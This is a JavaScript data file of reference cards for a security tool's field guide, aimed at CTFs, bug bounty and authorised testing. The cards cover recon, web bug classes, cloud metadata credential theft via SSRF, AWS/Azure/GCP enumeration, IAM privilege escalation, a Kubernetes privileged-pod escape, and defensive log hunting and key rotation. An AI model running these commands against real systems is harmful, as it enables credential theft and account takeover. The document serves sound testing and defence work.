/* Field guide — reference content for the Cloud section's Field guide tab.
   For CTFs, bug bounty and authorised security testing: enumeration, triage and
   defence starting points. Nothing runs from here — the commands are copyable text.
   Each group: {name, icon, note, cards:[{t, provider, body, cmds:[[label, command]], att}]}
   provider is a tag: aws | azure | gcp | k8s | web (web = general / app-layer). */
const CLOUDGUIDE = [
  {
    name: 'Recon & enumeration', icon: 'radar', note: 'Map the attack surface before anything else — subdomains, live hosts, endpoints and tech. The backbone of bug-bounty and external assessment work.',
    cards: [
      {t: 'Subdomains & assets', provider: 'web', body: 'Build the list of hosts in scope from passive sources, then confirm which resolve.',
        cmds: [['Passive subdomains', 'subfinder -d target.com -all -silent'], ['Resolve & probe', 'subfinder -d target.com -silent | httpx -silent -sc -title -tech-detect'], ['Amass (deeper)', 'amass enum -passive -d target.com'], ['Certificate names', 'curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r ".[].name_value" | sort -u']]},
      {t: 'Endpoints & URLs', provider: 'web', body: 'Gather known and crawled URLs; they reveal parameters, APIs and old paths.',
        cmds: [['Archived URLs', 'gau target.com | sort -u'], ['Crawl live', 'katana -u https://target.com -jc -silent'], ['Params', 'cat urls.txt | grep "=" | qsreplace -a'], ['JS files', 'katana -u https://target.com -jc | grep "\\.js$" | sort -u']]},
      {t: 'Content & vhost discovery', provider: 'web', body: 'Brute paths and virtual hosts to find hidden apps and files.',
        cmds: [['Dir brute', 'ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,204,301,302,307,401,403'], ['Vhosts', 'ffuf -u https://target.com -H "Host: FUZZ.target.com" -w subs.txt -fs 0'], ['Backups/configs', 'ffuf -u https://target.com/FUZZ -w raft-words.txt -e .bak,.old,.zip,.config,.env']]},
      {t: 'Ports & services', provider: 'web', body: 'Find open ports and the services behind them (for hosts in scope).',
        cmds: [['Fast port sweep', 'naabu -host target.com -top-ports 1000 -silent'], ['Service/version', 'nmap -sV -sC -p- --min-rate 2000 target.com'], ['HTTP on odd ports', 'naabu -host target.com -p - | httpx -silent']]}
    ]
  },
  {
    name: 'Finding & triaging bugs', icon: 'bug', note: 'Common web and API bug classes — what to look for, and how to confirm them on scope you are authorised to test. Pair with Burp Suite for manual work.',
    cards: [
      {t: 'Automated nuclei sweep', provider: 'web', body: 'Template-based scanning for known issues, misconfigurations and exposures. Good first pass before manual testing.',
        cmds: [['All templates', 'nuclei -l live-hosts.txt -severity low,medium,high,critical'], ['Exposures only', 'nuclei -l live-hosts.txt -t exposures/ -t misconfiguration/'], ['CVEs', 'nuclei -l live-hosts.txt -t cves/ -silent']], att: 'T1595'},
      {t: 'Access control & IDOR', provider: 'web', body: 'The highest-value bug class. Look for object IDs in URLs/bodies, and check whether another account can read or change them.',
        cmds: [['Spot IDs to test', 'gau target.com | grep -Eo "(id|user|account|order|doc)=[0-9a-f]+"'], ['Compare two sessions', 'send the same request with user B’s cookie and watch for user A’s data'], ['Method/role swap', 'try GET→PUT/DELETE, and low-priv token on admin endpoints']], att: 'T1190'},
      {t: 'SSRF (to cloud metadata)', provider: 'web', body: 'If a parameter fetches a URL, point it inward. SSRF that reaches the instance metadata service is a direct path to cloud credentials (see the Metadata tab).',
        cmds: [['Find URL-ish params', 'grep -Eo "(url|uri|path|dest|redirect|img|feed|host)=[^&]+" urls.txt'], ['Internal targets', 'http://169.254.169.254/  ·  http://localhost/  ·  http://[::1]/'], ['Out-of-band check', 'use an interactsh / Burp Collaborator host to catch blind SSRF']], att: 'T1190'},
      {t: 'Injection & template', provider: 'web', body: 'Where input reaches a query, a template or the OS. Confirm with safe, reversible probes before anything else.',
        cmds: [['SQLi (authorised)', 'sqlmap -u "https://target/item?id=1" --batch --level 2 --risk 1'], ['SSTI probe', 'send {{7*7}} / ${7*7} / #{7*7} and look for 49'], ['XSS discovery', 'dalfox url "https://target/search?q=FUZZ"']], att: 'T1059'},
      {t: 'Auth & session', provider: 'web', body: 'Login, reset, MFA and token handling are common weak points.',
        cmds: [['JWT review', 'decode in OSINTrix Decoder; test alg=none and a weak HMAC secret: hashcat -m 16500 jwt.txt wordlist'], ['Reset tokens', 'check for predictable/guessable tokens, host-header poisoning in reset links'], ['Session fixation', 'does the session ID change on login?']], att: 'T1078'}
    ]
  },
  {
    name: 'Secrets & exposure', icon: 'key-round', note: 'Leaked credentials and exposed files are some of the fastest findings. Scan code, JS bundles and public buckets.',
    cards: [
      {t: 'Secrets in code & JS', provider: 'web', body: 'Hardcoded keys and tokens in repositories and front-end bundles.',
        cmds: [['Repo history', 'trufflehog git https://github.com/org/repo --only-verified'], ['Local tree', 'gitleaks detect --source . --redact'], ['JS bundles', 'cat js-files.txt | nuclei -t exposures/tokens/ -silent']], att: 'T1552.001'},
      {t: 'Exposed files & config', provider: 'web', body: 'Config, env and VCS metadata left reachable on the web.',
        cmds: [['Common leaks', 'nuclei -l live-hosts.txt -t exposures/configs/ -t exposures/files/'], ['.git exposed', 'curl -s https://target.com/.git/HEAD  (then git-dumper if present)'], ['.env / backups', 'ffuf -u https://target.com/FUZZ -w sensitive.txt -mc 200']], att: 'T1083'},
      {t: 'Public cloud storage', provider: 'aws', body: 'Open S3 / GCS / Azure blobs tied to the target, read without credentials.',
        cmds: [['S3 (no creds)', 'aws s3 ls s3://<bucket> --no-sign-request'], ['Name guessing', 'try <company>, <company>-assets, -backups, -dev, -logs'], ['GCS / Azure', 'gsutil ls gs://<bucket>  ·  curl https://<acct>.blob.core.windows.net/<container>?restype=container&comp=list']], att: 'T1530'}
    ]
  },
  {
    name: 'Metadata & SSRF', icon: 'server', note: 'The instance metadata service holds temporary cloud credentials. In a CTF or an authorised test, an SSRF that reaches these endpoints is a classic path to cloud access. Defenders: require IMDSv2 and alert on metadata reads from app processes.',
    cards: [
      {t: 'AWS instance metadata (IMDS)', provider: 'aws', body: 'IMDSv1 answers any request; IMDSv2 needs a token header first. Role credentials returned here are short-lived keys.',
        cmds: [['IMDSv2 token', 'TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 300")'], ['List roles', 'curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/'], ['Get role creds', 'curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>'], ['User data', 'curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/user-data']], att: 'T1552.005'},
      {t: 'Azure instance metadata (IMDS)', provider: 'azure', body: 'Requires the Metadata:true header. The identity endpoint returns an access token for the VM managed identity.',
        cmds: [['Instance info', 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"'], ['Managed-identity token', 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"']], att: 'T1552.005'},
      {t: 'GCP instance metadata', provider: 'gcp', body: 'Requires Metadata-Flavor: Google. The default service-account token endpoint returns an OAuth token.',
        cmds: [['SA token', 'curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"'], ['SA scopes', 'curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"'], ['Project SSH keys', 'curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"']], att: 'T1552.005'}
    ]
  },
  {
    name: 'AWS enumeration', icon: 'cloud', note: 'With keys in hand, confirm who you are, then map what they can reach. Add --no-sign-request to read public buckets without credentials.',
    cards: [
      {t: 'Identity & account', provider: 'aws', body: 'First call after getting any keys — confirms the account, the user/role ARN and whether the keys are live.',
        cmds: [['Caller identity', 'aws sts get-caller-identity'], ['Set keys for a session', 'export AWS_ACCESS_KEY_ID=… AWS_SECRET_ACCESS_KEY=… AWS_SESSION_TOKEN=…'], ['Account aliases', 'aws iam list-account-aliases']], att: 'T1087.004'},
      {t: 'What can these keys do', provider: 'aws', body: 'Enumerate attached policies and try IAM read calls. enumerate-iam and ScoutSuite automate this.',
        cmds: [['My user', 'aws iam get-user'], ['Attached user policies', 'aws iam list-attached-user-policies --user-name <U>'], ['Inline policies', 'aws iam list-user-policies --user-name <U>'], ['Simulate perms', 'aws iam simulate-principal-policy --policy-source-arn <ARN> --action-names iam:CreateUser s3:GetObject']], att: 'T1069.003'},
      {t: 'S3 buckets', provider: 'aws', body: 'List and read buckets; public buckets answer with --no-sign-request.',
        cmds: [['List my buckets', 'aws s3 ls'], ['List a public bucket', 'aws s3 ls s3://<BUCKET> --no-sign-request'], ['Sync a bucket down', 'aws s3 sync s3://<BUCKET> ./loot --no-sign-request'], ['Bucket policy', 'aws s3api get-bucket-policy --bucket <BUCKET>']], att: 'T1530'},
      {t: 'Secrets & parameters', provider: 'aws', body: 'Flags, tokens and DB passwords often sit in Secrets Manager or SSM Parameter Store.',
        cmds: [['List secrets', 'aws secretsmanager list-secrets'], ['Read a secret', 'aws secretsmanager get-secret-value --secret-id <NAME>'], ['SSM params', 'aws ssm describe-parameters'], ['Read SSM param (decrypt)', 'aws ssm get-parameter --name <NAME> --with-decryption']], att: 'T1552'},
      {t: 'Lambda & compute', provider: 'aws', body: 'Function env vars and code frequently hold secrets; EC2 user-data too.',
        cmds: [['List functions', 'aws lambda list-functions'], ['Function config (env vars)', 'aws lambda get-function-configuration --function-name <F>'], ['Download code', 'aws lambda get-function --function-name <F> --query Code.Location --output text'], ['EC2 user-data', 'aws ec2 describe-instance-attribute --instance-id <I> --attribute userData']], att: 'T1552.007'}
    ]
  },
  {
    name: 'AWS privilege escalation', icon: 'trending-up', note: 'Common IAM-based escalation paths. Each needs the listed permission on a wide enough Resource. Pacu’s iam__privesc_scan finds these automatically.',
    cards: [
      {t: 'Create a new access key', provider: 'aws', body: 'iam:CreateAccessKey on another user lets you take over that identity.',
        cmds: [['Make a key for another user', 'aws iam create-access-key --user-name <TARGET>']], att: 'T1098.001'},
      {t: 'Attach an admin policy', provider: 'aws', body: 'iam:AttachUserPolicy / AttachRolePolicy can attach AdministratorAccess to yourself.',
        cmds: [['Attach admin', 'aws iam attach-user-policy --user-name <ME> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess']], att: 'T1098.003'},
      {t: 'Pass a role to a service', provider: 'aws', body: 'iam:PassRole + a create call (Lambda/EC2/Glue) runs your code as a more privileged role.',
        cmds: [['Launch EC2 with a role', 'aws ec2 run-instances --iam-instance-profile Name=<PROFILE> --image-id <AMI> --instance-type t2.micro'], ['Lambda with a role', 'aws lambda create-function --role <ROLE_ARN> --runtime python3.12 --handler x.handler --zip-file fileb://f.zip --function-name p']], att: 'T1548'},
      {t: 'New policy version', provider: 'aws', body: 'iam:CreatePolicyVersion + SetDefaultPolicyVersion rewrites an attached policy to allow everything.',
        cmds: [['New version', 'aws iam create-policy-version --policy-arn <ARN> --policy-document file://admin.json --set-as-default']], att: 'T1098.003'}
    ]
  },
  {
    name: 'Azure & GCP enum', icon: 'cloud', note: 'Equivalent first-moves for Azure and GCP. az and gcloud read the signed-in context; ROADtools and ScoutSuite go deeper.',
    cards: [
      {t: 'Azure — who and what', provider: 'azure', body: 'Confirm the account, then list subscriptions, role assignments and key vaults.',
        cmds: [['Signed-in account', 'az account show'], ['My role assignments', 'az role assignment list --assignee <OBJECT_ID> --all'], ['List Key Vaults', 'az keyvault list'], ['Read a secret', 'az keyvault secret show --vault-name <V> --name <N> --query value -o tsv'], ['Storage keys', 'az storage account keys list --account-name <A>']], att: 'T1087.004'},
      {t: 'Azure — managed identity token to data', provider: 'azure', body: 'Trade a management token for a resource token (e.g. storage, Key Vault).',
        cmds: [['Token for Key Vault', 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"'], ['Use az with that token', 'az login --identity']], att: 'T1528'},
      {t: 'GCP — who and what', provider: 'gcp', body: 'List the active account, projects, service accounts and what the token can do.',
        cmds: [['Active account', 'gcloud auth list'], ['Projects', 'gcloud projects list'], ['Project IAM', 'gcloud projects get-iam-policy <PROJECT>'], ['List SAs', 'gcloud iam service-accounts list'], ['List buckets', 'gsutil ls'], ['Read secret', 'gcloud secrets versions access latest --secret=<NAME>']], att: 'T1087.004'},
      {t: 'GCP — impersonate a service account', provider: 'gcp', body: 'iam.serviceAccountTokenCreator on a more privileged SA lets you act as it.',
        cmds: [['Impersonate', 'gcloud <cmd> --impersonate-service-account=<SA_EMAIL>'], ['Mint a token', 'gcloud auth print-access-token --impersonate-service-account=<SA_EMAIL>']], att: 'T1134.001'}
    ]
  },
  {
    name: 'Kubernetes & containers', icon: 'box', note: 'From a pod, check the service-account token and whether you can reach the API or the node. In CTFs, a privileged pod or hostPath mount is usually the escape.',
    cards: [
      {t: 'Service-account token from a pod', provider: 'k8s', body: 'Every pod with a default SA has a token mounted. Use it against the API server.',
        cmds: [['Token', 'cat /var/run/secrets/kubernetes.io/serviceaccount/token'], ['API with token', 'curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces/default/pods'], ['What can I do', 'kubectl auth can-i --list']], att: 'T1552.001'},
      {t: 'Enumerate the cluster', provider: 'k8s', body: 'List secrets, pods and nodes; a readable secret often holds the flag or more creds.',
        cmds: [['Secrets', 'kubectl get secrets -A -o json'], ['Decode a secret', 'kubectl get secret <S> -o jsonpath="{.data.*}" | base64 -d'], ['Pods wide', 'kubectl get pods -A -o wide'], ['My permissions', 'kubectl auth can-i --list -A']], att: 'T1613'},
      {t: 'Escape a privileged pod', provider: 'k8s', body: 'A privileged container or hostPath mount of / lets you reach the node filesystem and processes.',
        cmds: [['Mount host disk', 'ls /host 2>/dev/null; chroot /host sh'], ['Nsenter onto host', 'nsenter --target 1 --mount --uts --ipc --net --pid -- bash'], ['Spawn a privileged pod', 'kubectl run x --image=alpine --overrides=\'{"spec":{"hostPID":true,"containers":[{"name":"x","image":"alpine","securityContext":{"privileged":true},"command":["nsenter","--target","1","--mount","--","bash"]}]}}\' -it']], att: 'T1611'}
    ]
  },
  {
    name: 'Defence & forensics', icon: 'shield-check', note: 'For blue-teamers and responders: which logs to pull and what to look for when a cloud account or app is suspected compromised.',
    cards: [
      {t: 'Pull the logs', provider: 'aws', body: 'The audit trail per provider. Export and open them in Cloud → Log hunting, or send events to a case timeline.',
        cmds: [['AWS CloudTrail lookup', 'aws cloudtrail lookup-events --max-results 50'], ['Azure activity log', 'az monitor activity-log list --offset 7d'], ['GCP audit log', 'gcloud logging read "logName:cloudaudit.googleapis.com" --limit 50 --format json']], att: 'DS0002'},
      {t: 'Key events to hunt', provider: '', body: 'High-signal API calls across providers: new credentials, IAM/policy changes, logging turned off, security services disabled, bucket exposure changes, secret reads. The Log-hunting tab flags these automatically.',
        cmds: [['AWS', 'CreateAccessKey · AttachUserPolicy · PutUserPolicy · CreatePolicyVersion · PassRole · StopLogging · DeleteTrail'], ['Azure', 'roleAssignments/write · KeyVault secret get · Security contacts write'], ['GCP', 'SetIamPolicy · serviceAccounts token · logging sink delete']], att: 'T1078.004'},
      {t: 'Contain & rotate', provider: '', body: 'Standard first steps once a credential is confirmed compromised.',
        cmds: [['AWS — disable a key', 'aws iam update-access-key --access-key-id <ID> --status Inactive --user-name <U>'], ['AWS — revoke role sessions', 'attach an inline deny with a DateLessThan aws:TokenIssueTime condition'], ['Azure — disable user', 'az ad user update --id <UPN> --account-enabled false'], ['GCP — disable key', 'gcloud iam service-accounts keys disable <KEY_ID> --iam-account <SA>']], att: 'M1018'}
    ]
  },
  {
    name: 'CTF & misc', icon: 'flag', note: 'Quick starting points for non-cloud categories. Not exhaustive — enough to begin and recall the common tools.',
    cards: [
      {t: 'Crypto', provider: '', body: 'Identify the scheme first, then reach for the matching tool.',
        cmds: [['Identify', 'use OSINTrix Decoder (auto) or hash-identifier'], ['RSA attacks', 'RsaCtfTool --publickey key.pem --private'], ['Crack hash', 'hashcat -m <mode> hash.txt wordlist ; john --wordlist=rockyou hash.txt'], ['XOR / repeating key', 'xortool -c 20 file.bin']]},
      {t: 'Forensics', provider: '', body: 'Files, captures, memory and disk. OSINTrix opens PCAPs and SQLite in Forensics kit.',
        cmds: [['File type / strings', 'file x; strings -n 8 x; binwalk -e x'], ['PCAP', 'open in OSINTrix → Forensics kit → PCAP; or tshark -r x.pcap -Y http'], ['Memory', 'volatility3 -f mem.raw windows.pslist'], ['Metadata', 'exiftool x']]},
      {t: 'Steganography', provider: '', body: 'Images and audio hiding data. Try the obvious containers first.',
        cmds: [['Images', 'zsteg x.png ; steghide extract -sf x.jpg ; stegsolve (bit planes)'], ['Guess passphrase', 'stegseek x.jpg rockyou.txt'], ['Audio', 'open in Audacity → spectrogram'], ['LSB / QR', 'OSINTrix → Forensics kit → image tools (LSB, bit planes, QR)']]},
      {t: 'Reversing & pwn', provider: '', body: 'Static look, then dynamic. For pwn, find the bug class and build an exploit with pwntools.',
        cmds: [['Triage', 'file bin; checksec --file=bin; strings bin'], ['Disassemble', 'ghidra (GUI) ; r2 -A bin ; objdump -d bin'], ['Debug', 'gdb bin (with pwndbg/gef)'], ['Exploit template', 'from pwn import *; p=process("./bin")  # cyclic, offset, ROP']]}
    ]
  }
];
